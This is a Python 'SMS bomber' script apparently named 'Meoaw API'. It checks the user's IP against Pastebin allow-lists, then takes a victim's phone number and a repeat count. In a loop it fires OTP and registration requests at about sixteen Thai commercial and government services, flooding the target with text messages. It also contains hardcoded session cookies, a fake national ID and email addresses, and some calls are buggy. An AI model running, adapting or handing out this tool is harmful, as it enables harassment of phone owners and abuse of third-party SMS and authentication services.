import requests

import platform

import os

import time

import socket

from tqdm import trange, tqdm

from requests import *

from re import A, search

from requests import post, Session, get

from pystyle import *

useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"

def start():

    os.system('title Meoaw API / Starting')

    if platform.system() == 'Windows':

        import time

        time.sleep(1)

        os.system('cls')

        os.system('title Meoaw API / Check IP')

        host=socket.gethostname()

        IP=socket.gethostbyname(host)

        print(" ")

        Write.Print(f"Meoaw IP: MeoawJi-{IP}-PC", Colors.cyan_to_green,interval=0.10)

        print(" ")

        import time

        time.sleep(2)

        host=socket.gethostname()

        IP=socket.gethostbyname(host)

        meoaw = requests.get("https://pastebin.com/raw/utGFtJL2")

        if IP in meoaw.text:

            os.system('cls')

            os.system('title Meoaw API / Welcome !')

            print(" ")

            Write.Print(f"Welcome {host} to Meoaw API !", Colors.green,interval=0.10)

            print(" ")

            import time

            time.sleep(2)

            if platform.system() == 'Windows':

                os.system('cls')

                os.system('title Meoaw API / Loading')

                Write.Print("""

                 ▄▄   ▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄     ▄    ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄ 

                █  █▄█  █       █       █      █ █ ▄ █ █  █       █       █   █

                █       █    ▄▄▄█   ▄   █  ▄   █ ██ ██ █  █   ▄   █    ▄  █   █

                █       █   █▄▄▄█  █ █  █ █▄█  █       █  █  █▄█  █   █▄█ █   █

                █       █    ▄▄▄█  █▄█  █      █       █  █       █    ▄▄▄█   █

                █ ██▄██ █   █▄▄▄█       █  ▄   █   ▄   █  █   ▄   █   █   █   █

                █▄█   █▄█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄█ █▄▄█▄▄█ █▄▄█  █▄▄█ █▄▄█▄▄▄█   █▄▄▄█

                """, Colors.green_to_cyan,interval=0.01)

                import time

                time.sleep(2)

                os.system('cls')

                for i in trange(200, desc='Check Update'):

                    time.sleep(.07)

                os.system('cls')

                mv = requests.get("https://pastebin.com/raw/3D6hw6YL")

                lv = mv.text

                if lv == "1":

                    os.system('title Meoaw API / License Pass !')

                    print(" ")

                    print("Your program Last Version !")

                    print(" ")

                    import time

                    time.sleep(2)

                    os.system('cls')

                    os.system('title Meoaw API / SMS UI')

                    print(" ")

                    print(" ")

                    phone = Write.Input("Phone: ", Colors.cyan_to_green, interval=0.15)

                    print(" ")

                    print(" ")

                    os.system('cls')

                    print(" ")

                    print(" ")

                    phonev2 = Write.Input("Phone V2 ( +66 ): ", Colors.cyan_to_blue, interval=0.15)

                    print(" ")

                    print(" ")

                    count = Write.Input("Count: ", Colors.red_to_purple, interval=0.15)

                    print(" ")

                    print(" ")

                    os.system('cls')

                    attack(phone,phonev2,count)

                elif lv == "2":

                    os.system('title Meoaw API / Not License :(')

                    print(" ")

                    print("Pls update new version to use :(")

                    print(" ")

                elif lv == "3":

                    os.system('title Meoaw API / Updating !')

                    print(" ")

                    print("Program has close to fix all bug wait <3")

                    print(" ")    

            

            else:

                os.system('clear')

                print(" ")

                print(" ")

                Write.Print("Meoaw Sms", Colors.green_to_cyan,interval=0.10)

                print(" ")

                print(" ")

                phone = Write.Input("Phone: ", Colors.cyan_to_green, interval=0.15)

                os.system('cls')

                print(" ")

                print(" ")

                count = Write.Input("Count: ", Colors.red_to_purple, interval=0.15)

                print(" ")

                print(" ")

                os.system('clear')

                attack(phone,count)

        else:

            os.system('cls')

            host=socket.gethostname()

            IP=socket.gethostbyname(host)

            print(" ")

            print(" ")

            Write.Print(f"Your Meoaw IP: MeoawJi-{IP}-PC Not found !", Colors.yellow_to_green,interval=0.10)

            print(" ")

            print(" ")

    else:

        os.system('clear')

        host=socket.gethostname()

        IP=socket.gethostbyname(host)

        meoaw = requests.get("https://pastebin.com/raw/rtuNQQ80")

        if IP in meoaw.text:

            Write.Print(f"Welcome {host} to Meoaw API !", Colors.green,interval=0.10)

        else:

            print(" ")

            print(" ")

            Write.Print(f"Your IP: MeoawJi-{IP}-Mobile Not found !", Colors.yellow_to_green,interval=0.10)

            print(" ")

            print(" ")

def attack(phone , phonev2 ,count):

    i = 0

    

    while ( i < int(count) ):

        i += 1

        # Easy Money ( รัวได้ )

        try:

            auth01 = requests.post("https://www.easymoney.co.th/estimate/actionSendOtp",data=f"gg_token&name=cybersafe&surname=cybersafe&email=rjrockyou@gmail.com&phone={phone}&area_id=2&password=Hack80&password_chk=Hack80&code=&condition=1",headers={"accept":"application/json, text/javascript, */*; q=0.01","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36","cookie":"PHPSESSID=1933025720c12fcbb618a207ad775e54;_gcl_au=1.1.506859633.1650848781;_fbp=fb.2.1650848782133.743024538;_ga=GA1.3.1379383593.1650848782;pdpa=1;_gid=GA1.3.380431543.1651807350;_gat_UA-182229042-1=1"})

            print(auth01.status_code)

            print(auth01.json())

        except:

            print("Fail :(")

        # Carsome ( รัวได้ )

        try:

            auth02 = requests.post("https://www.carsome.co.th/website/login/sendSMS", json={"username": f"{phone}", "optType": 0})

            print(auth02.status_code)

            print(auth02.json())

        except:

            print("Fail :(")

        try:

            # Carsome re send

            auth03 = requests.post("https://www.carsome.co.th/website/login/sendSMS", json={"username": f"{phone}", "optType": 0})

            print(auth03.status_code)

            print(auth03.json())

        except:

            print("Fail :(")

        try:

            # Makro

            auth04 = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password": "1111a1111A","name": phone,"provinceCode": "74","districtCode": "970","subdistrictCode": "8654","zipcode": "94140","siebelCustomerTypeId": "710","locale": "th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})

            print(auth04.status_code)

            print(auth04.json())

        except:

            print("Fail :(")

        try:

            # The 1 ( รัวได้ )

            auth05 = requests.get("https://www.baanandbeyond.com/registration_initiate?on%5Bcountry%5D=66&on%5Bvalue%5D="+ phone + "&type=mobile")

            print(auth05.status_code)

            print(auth05.json())

        except:

            print("Fail :(")

        try:

            # Lotus

            auth06 = requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})

            print(auth06.status_code)

            print(auth06.json())

        except:

            print("Fail :(")

        try:

            # MGBCONFIRM

            auth07 = requests.post("https://www.mtsblockchain.com/mgb-api/user/register/reqotp",json={"mobile": phone},headers={"Content-Type":"application/json","Cookie":"_ga=GA1.2.1476569446.1657959172; _gid=GA1.2.587325211.1657959172; _gat_gtag_UA_230676474_1=1; connect.sid=s%3Avu1rVQbmGkMrSzQS7GYQ-y4VHMxHdmH7.zuhlp%2BBtukL2ksityudE9OTqdUH5G3dk3XHm3zNEHIs; cookie_policy_accepted=1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"})

            print(auth07.status_code)

            print(auth07.json())

        except:

            print("Fail :(")

        try:

            # Youpik

            auth08 = requests.post("https://api.ulive.youpik.com/api-base/sms/sendCode",headers={"authorization": "Basic d2ViQXBwOndlYkFwcA==","content-type": "application/x-www-form-urlencoded;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},data=f"phone={phone[1:]}&type=1")

            print(auth08.status_code)

            print(auth08.json())

        except:

            print("Fail :(")

        try:

            # True Money ( รัวได้ )

            auth09 = requests.post("https://pygw.csne.co.th/api/gateway/truewalletRequestOtp",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "pygw_csne_coth=91207b7404b2c71edd9db8c43c6d18c23949f5ea"},data=f"transactionId=b05a66a7e9d0930cbda4d78b351ea6f7&phone={phone}")

            print(auth09.status_code)

            print(auth09.json())

        except:

            print("Fail :(")

        try:

            # SSO

            auth10 = requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")

            print(auth10.status_code)

            print(auth10.json())

        except:

            print("Fail :(")

        try:

            # BUGABOOTV ( รัวได้ )

            auth11 = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent":"Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target":"AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId": "6g47av6ddfcvi06v4l186c16d6","Username": f"+66{phone[1:]}"})

            print(auth11.status_code)

            print(auth11.json())

        except:

            print("Fail :(")

        try:

            # Ais play ( รัวได้ )

            session = Session

            ReqTOKEN = session.get(

                    "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",

                    headers={

                        "User-Agent": useragent

                    }).text

            auth12 = session.post(

                    "https://srfng.ais.co.th/api/v2/login/sendOneTimePW",

                    data=

                    f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",

                    headers={

                        "User-Agent":

                        useragent,

                        "Content-Type":

                        "application/x-www-form-urlencoded; charset=UTF-8",

                        "authorization":

                        f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''

                    })

        except:

            print("Fail :(")

        try:

            auth13 = requests.post("https://app.dtac.co.th/api/auth/local-auth/otp?lang=th&uid=guest", json={"msisdn": f"{phone}"})

            print(auth13.status_code)

        except:

            print("Fail :(")

        try:

            auth14 = requests.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel": f"{phone}", "type": "login"})

            print(auth14.status_code)

            print(auth14.json())

        except:

            print("Fail :(")

        try:

            auth15 = requests.post("https://mapi.konglor888.com/api/otp/register", json={"applicant": f"{phone}", "serviceName": "konglor888.com"})

            print(auth15.status_code)

            print(auth15.json())

        except:

            print("Fail :(")

        try:

            auth16 = requests.post("https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no": f"{phone}"})

            print(auth16.status_code)

            print(auth16.json())

        except:

            print("Fail :(")

        print(f"Round: {i} / 10")

    

    else:

        print("Done !")

        import time

        time.sleep(1)

        os.system('cls')

        

start()
